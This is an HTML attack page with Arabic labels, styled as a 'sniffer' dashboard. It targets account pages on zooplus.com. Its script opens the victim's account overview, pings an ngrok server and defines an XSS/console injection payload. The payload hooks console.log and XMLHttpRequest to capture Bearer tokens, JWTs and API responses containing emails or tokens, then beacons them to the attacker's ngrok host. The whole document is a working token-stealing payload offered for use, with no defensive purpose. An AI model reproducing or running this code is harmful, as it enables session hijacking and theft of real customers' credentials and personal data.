<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>تحديث أمني للنظام</title>
    <style>
        body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; text-align: center; padding: 50px; }
        .dashboard { border: 2px solid #00ff41; padding: 30px; display: inline-block; box-shadow: 0 0 15px #00ff41; }
        .blink { animation: blinker 1.5s linear infinite; color: red; }
        @keyframes blinker { 50% { opacity: 0; } }
    </style>
</head>
<body>

    <div class="dashboard">
        <h2>[+] نظام المراقبة النشط (Active Sniffer)</h2>
        <p class="blink">جاري الربط مع Ngrok Tunnel...</p>
        <hr color="#00ff41">
        <button onclick="executeAttack()" style="padding:15px; background:#00ff41; color:#000; cursor:pointer; font-weight:bold;">
            بدء اعتراض التوكن (Sentry Hook)
        </button>
    </div>

    <script>
        const NGROK_URL = 'https://subsphenoidal-dauntlessly-pura.ngrok-free.dev';

        function executeAttack() {
            // 1. فتح نافذة الضحية
            const victimWin = window.open('https://www.zooplus.com/account/overview', 'Victim');

            // 2. إرسال تنبيه للسيرفر
            navigator.sendBeacon(NGROK_URL, JSON.stringify({ status: "Attack Initiated", method: "Sentry/Console Hook" }));

            // 3. كود الحقن (المفترض استخدامه عبر XSS أو الكونسول)
            // هذا الجزء يحاكي ما سيحدث إذا تم حقن الكود داخل الموقع
            const injectionCode = `
                (function() {
                    const NGROK = '${NGROK_URL}';
                    
                    // اعتراض الـ Console Log الذي يستخدمه Sentry لطباعة التوكن
                    const oldLog = console.log;
                    console.log = function(...args) {
                        const content = JSON.stringify(args);
                        if (content.includes("Bearer") || content.includes("eyJ")) {
                            navigator.sendBeacon(NGROK, JSON.stringify({
                                type: "TOKEN_STOLEN_FROM_LOGS",
                                data: args,
                                url: window.location.href
                            }));
                        }
                        return oldLog.apply(console, args);
                    };

                    // اعتراض استجابات API (Object Hooking)
                    const oldXHR = XMLHttpRequest.prototype.send;
                    XMLHttpRequest.prototype.send = function() {
                        this.addEventListener('load', function() {
                            if (this.responseText.includes("email") || this.responseText.includes("token")) {
                                navigator.sendBeacon(NGROK, JSON.stringify({
                                    type: "XHR_INTERCEPTED",
                                    response: this.responseText
                                }));
                            }
                        });
                        return oldXHR.apply(this, arguments);
                    };
                })();
            `;

            console.log("السكريبت جاهز للحقن. بمجرد تفعيل XSS، سيتم سحب التوكن تلقائياً.");
        }
    </script>
</body>
</html>
